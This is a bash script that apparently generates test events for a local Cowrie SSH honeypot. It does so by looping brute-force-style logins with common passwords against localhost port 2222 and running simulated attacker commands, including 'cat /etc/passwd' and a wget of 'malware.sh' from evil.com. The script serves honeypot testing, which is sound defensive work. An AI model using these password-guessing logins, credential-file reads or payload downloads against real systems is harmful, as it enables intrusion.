#!/bin/bash
# Test script to generate Cowrie honeypot events

echo "=== Testing Cowrie Honeypot ==="
echo "Attempting 5 SSH connections with different passwords..."

for i in {1..5}; do
    echo "Attempt $i: Trying common passwords..."
    
    # Try different passwords (all will fail or succeed based on Cowrie config)
    sshpass -p "admin" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@localhost "whoami; ls -la; exit" 2>&1 | grep -v "Warning:" &
    sleep 1
    
    sshpass -p "password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@localhost "cat /etc/passwd; exit" 2>&1 | grep -v "Warning:" &
    sleep 1
    
    sshpass -p "123456" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 admin@localhost "wget http://evil.com/malware.sh; exit" 2>&1 | grep -v "Warning:" &
    sleep 2
done

wait
echo "=== Test complete! Check your dashboard for new events ==="
